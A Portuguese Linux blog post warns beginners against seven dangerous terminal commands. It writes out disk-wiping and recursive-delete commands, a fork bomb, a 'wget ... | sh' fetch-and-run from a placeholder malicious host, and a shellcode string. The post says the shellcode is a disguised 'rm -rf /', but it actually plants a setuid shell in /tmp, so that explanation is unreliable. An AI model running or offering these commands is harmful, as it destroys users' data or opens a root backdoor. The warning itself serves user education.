---
title: "7 Comandos perigosos."
author: "Nilsonlinux"
output:
 html_document:
   toc: true
   keep_md: yes
categories: Terminal
layout: post
featured_image: /images/linux/7-comand-danger.png
---



## 7 comandos perigosos do Linux que você NUNCA deve executar  ##

Como o número de usuários leigos de Linux vem aumentando com o tempo, acho pertinente alertar as pessoas sobre alguns comandos que podem ser perigosos, tanto para o sistema, quanto para os dados contidos no computador. 

Como o número de usuários leigos de Linux vem aumentando com o tempo, acho pertinente alertar as pessoas sobre alguns comandos que podem ser perigosos, tanto para o sistema, quanto para os dados contidos no computador.

O terminal é uma ferramenta muito poderosa, por conta disso é bom você dominá-lo, ou pelo menos entendê-lo, para evitar problemas no seu sistema baseado em Linux.
 Os grandes problemas que você pode enfrentar usando o terminal de forma indiscriminada normalmente estão atrelados a comandos de sobrescrita de dados, então vamos mostrar alguns aqui que você deve prestar especial atenção quando vir alguém sugerindo que você faça no seu computador com Linux.

Atenção: Você NÃO deve executar nenhum destes comandos no seu computador, isso pode causar danos irreversíveis que nós não nos responsabilizamos, o artigo tem a intenção de ser instrutivo, justamente para evitar este tipo de situação.

1 - ```rm -rf```

É um comando clássico do do Linux que teoricamente não faz nada de mais, ele serve apenas para apagar arquivos, e é aí que mora o perigo. Dependendo da forma que ele for aplicativo o resultado pode ser muito desagradável, por isso é importante você entender o que os comandos fazem, vamos explicar um pouco melhor neste exemplo:
- rm: comando usado no Linux para deletar arquivos.
- rm -r: o comando deleta pastas recursivamente, mesmo que a pastas esteja vazia.
- rm -f: cUsando este parâmetro, o propriedade de "apenas leitura" que um arquivo tenha é removida sem perguntar, permitindo que o arquivo seja apagado.
- rm -rf / : Usando a combinação dos dois parâmetros com a "/" você diz para o sistema apagar tudo que está no diretório raiz do sistema.
- rm -rf * : Força o apagamento de tudo que está no diretório atual ou no de trabalho, dependendo de onde você estiver.
- rm -rf . : Acrescentando um ponto, você pode apagar também as pastas ocultas, além das normais.

Tome muito cuidado ao executar um comando destes, especialmente se for feito como root ou usando o sudo.

 Tão perigoso que pode ser este comando, que atualmente o Linux se protege contra ele, se você rodá-lo, mesmo com sudo ou como root, ele não vai funcionar, para isso é preciso usar os parâmetros descritos na imagem acima. Da mesma forma que o Linux protege você de destruir o sistema sem querer, ele também permite que você o destrua mediante a ter certeza de que é realmente isso que você quer, curioso, não é?

2 - ```:(){:|:&};:```

Este comando funciona como uma "Fork Bomb", ele opera definindo uma função chamada ':', que se chama duas vezes, uma vez em primeiro plano e outra em segundo plano, o processo se repete indefinidamente até que o sistema trave.

3 - qualquer comando para > /dev/sda

A forma com que o Linux lê as partições e discos é diferente do Windows, por conta disso, normalmente novatos não conseguem entender em primeira instância como eles são distribuídos. Normalmente a localização dos dispositivos de armazenamento do sistema ficam dentro de /dev, sendo que podem haver vários por ali e normalmente o sda está presente.

O problema do comando acima é que ele redireciona a saída de qualquer comando que seja colocado para o seu bloco de armazenamento, desta foma sobrescrevendo alguns dados e corrompendo outros.

4 - ```mv pasta/diretório /dev/null```

Eu costumava brincar sobre o /dev/null me referindo a ele como o "buraco negro" do Linux. Tudo que é enviado para ele é perdido "para sempre". Então tome cuidado ao mover qualquer coisa para esta localização. O comando mv serve para mover arquivos ou diretórios para o destino indicado, se este destino for o /dev/null você estará mandando seus arquivos pra Nárnia.

5 - ```wget http://malicious_source -O- | sh```

Este comando vai aparecer para você instalar alguns programas. O wget é o programa responsável por fazer o download da URL que vem logo após, ele é bem útil para baixar arquivos em geral, o problema está no arquivo que ele baixa e na sequência do comando  que o executa no caso dele ser um shell script. Só baixe arquivos desta forma de fontes que você considera confiáveis e se estiver na dúvida, baixe apenas o arquivo de shell, eliminando qualquer parâmetro que apareça após o link, assim você pode abrir ele em um editor de texto de sua preferência e verificar o que há dentro dele.

6 - ```dd if=/dev/random of=/dev/sda```

Assim como o ítem 3 da nossa lista, o grande problema aqui é o destino ser o /dev/sda. Tome cuidado. O comando dd pode ser muito útil para copiar arquivos e até mesmo partições inteiras, como no exemplo 6, mas se a saída for um outro disco, tome cuidado, pois o resultado irá sobrepor os dados lá existentes.

7 - Comandos disfarçados

Como eu comentei à princípio, o terminal é uma ferramenta poderosa, se você não dominá-lo, é bom ter cuidado com que você for rodar nele, se o você não fala a língua do terminal, saiba que ele fala muitas outras. O comando abaixo nada mais é do que o comando indicado no primeiro item da nossa lista, só que em forma hexadecimal.

    char esp[] __attribute__ ((section(“.text”))) /* e.s.p release */ = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″ “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″ “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″ “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″ “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″ “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″ “\x6e\x2f\x73\x68\x00\x2d\x63\x00″ “cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;”;


Ele tem o mesmo propósito do famigerado "rm -rf /", por isso, não rode coisas no terminal que você não sabe para quem servem, existem muito conteúdo grátis a internet para você estudar sobre e até mesmo alguns bons cursos pagos, como é o caso do "Dominando o Terminal" aqui do blog mesmo, mas em linhas gerais, se você evitar colocar comandos que você não sabe para que servem direito, os problemas já serão minimizados. 

Agora espalhe este conhecimento para ajudar mais pessoas a ficarem precavidas sobre estes pequenos percalços da vida computacional.

Fonte; https://www.diolinux.com.br/2017/01/7-comandos-mais-perigosos-linux.html